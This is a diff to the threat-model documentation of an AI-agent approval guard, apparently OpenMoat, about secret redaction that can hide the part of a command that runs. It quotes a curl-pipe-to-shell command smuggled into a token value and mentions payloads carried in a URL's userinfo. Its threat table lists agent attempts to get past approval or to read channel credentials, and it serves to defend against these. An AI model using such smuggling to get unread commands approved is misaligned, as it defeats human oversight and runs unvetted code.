@@ -110,7 +110,11 @@ brokered values), control and bidirectional characters are shown escaped
 (`render::clean`), and it is cut to 1500 characters; a write's content is never sent,
 only its size and digest. A call that had to be cut is marked so in the signed request
 (`cut`): its prompt offers Deny only on every channel, and the guard refuses an approval
-for it even if one is made. The message is plain text (no `parse_mode`), with link previews
+for it even if one is made. The same holds when redaction changed any of the text shown
+(`redacted`): a value that looks like a secret may be the part that runs
+(`API_TOKEN="$(curl … | sh)" make test` shows as `API_TOKEN=[redacted] make test`), and a
+URL's userinfo may carry the payload, so the approver is told that parts of the call are
+hidden and that it is approved at the terminal. The message is plain text (no `parse_mode`), with link previews
 off, so nothing the agent wrote is rendered as markup or fetched by Telegram. The two
 buttons are OpenMoat's. A command that says "approved by the security team" is still
 shown as the command it is.
@@ -159,6 +163,7 @@ shown as the command it is.
 | An approver of one channel answering as an approver of another (same number on two services) | approver ids qualified by the core with the registered channel name; settings refuse another channel's id; the guard refuses an answer from another channel | `remote::tests::another::ids_of_two_channels_never_collide` |
 | A call too long for the channel to show, approved unread | Deny only: the approve code is never sent | `remote::tests::text::a_call_the_channel_cannot_show_whole_can_only_be_denied` |
 | A call longer than the 1500 characters kept, approved unread | the request carries a signed `cut` flag; every channel offers Deny only, and the guard uses no approval for a cut request | `remote::tests::text::a_call_too_long_to_keep_whole_can_only_be_denied` |
+| Redaction hides the part that runs (`X="$(curl … \| sh)"`, a URL's userinfo), approved unread | the request carries a signed `redacted` flag; Deny only, and the guard uses no approval for it | `remote::tests::text::a_call_redaction_changed_can_only_be_denied` |
 | Agent reads a channel's credential under the per-channel layout | `kernel-self` read deny on `~/.moat/remote/**` | conformance `T9-read-remote-channel-credential`, `T9-cat-remote-channel-credential-glob`, `T9-read-moved-remote-channel-credential` |
 
 Limits, written in `docs/APPROVALS.md` and `docs/LIMITS.md`: an approver's Telegram
